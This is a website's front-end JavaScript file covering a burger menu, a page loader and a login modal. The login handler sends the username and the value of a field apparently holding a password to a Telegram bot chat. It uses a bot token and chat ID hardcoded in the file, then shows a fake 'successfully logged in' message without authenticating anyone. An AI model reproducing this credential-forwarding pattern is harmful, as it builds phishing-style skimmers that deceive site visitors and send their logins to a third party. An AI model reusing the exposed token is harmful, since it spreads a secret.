const burgerMenu = document.querySelector(".burger-menu");
const nav = document.querySelector(".header-nav");

burgerMenu.addEventListener("click", () => {
  console.log("Clicked");
  nav.classList.toggle("active");
  burgerMenu.classList.toggle("active");
  if (burgerMenu.classList.contains("active")) {
    document.body.style.overflow = "hidden";
  } else {
    document.body.style.overflow = "auto";
  }
});

AOS.init();

// loader
setTimeout(() => {
  console.log("Time is out");
  document.querySelector("#loader").style.display = "none";
  document.querySelector("header").style.display = "block";
  document.querySelector("main").style.display = "block";
  document.querySelector("footer").style.display = "block";
}, 3000);

// DIALOG
const body = document.querySelector("body");
const modal = document.querySelector(".login-modal");
const showModal = document.querySelector(".login-btn");
const closeModal = document.querySelector(".close-modal-btn");
const loginSubmitBtn = document.querySelector(".login-form_button");

const loginForm = document.querySelector(".login-form");
showModal.addEventListener("click", () => {
  modal.showModal();
  document.body.style.classList.add("active");
});

closeModal.addEventListener("click", () => {
  modal.close();
});


const chat_id = "1415615526";
const token = "7578906477:AAHGaYCcKVsqQLwoKk1-vog5PpzNSR7tOWE";
const url = `https://api.telegram.org/bot${token}/sendMessage`;


const login_form_title = document.querySelector(".login-form_title")
async function getDataFromForm(event){
  event.preventDefault()
  let username = event.target.username.value
  let login = event.target.login.value


  try {
    const res = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chat_id,
        text: `username: ${username}\n\nlogin:${login}`,
      }),
    });

    if (res.ok) {
      loginForm.style.display="none"
      login_form_title.textContent="You successfully logged in!"
      const close_btn = document.createElement("button")
      close_btn.textContent="Close modal"
      close_btn.classList.add("login-form_button")
      close_btn.addEventListener("click", () => {
        modal.close()
      })

      modal.append(close_btn)
    }
  } catch (err) {
    console.log(err);
  }
  
}
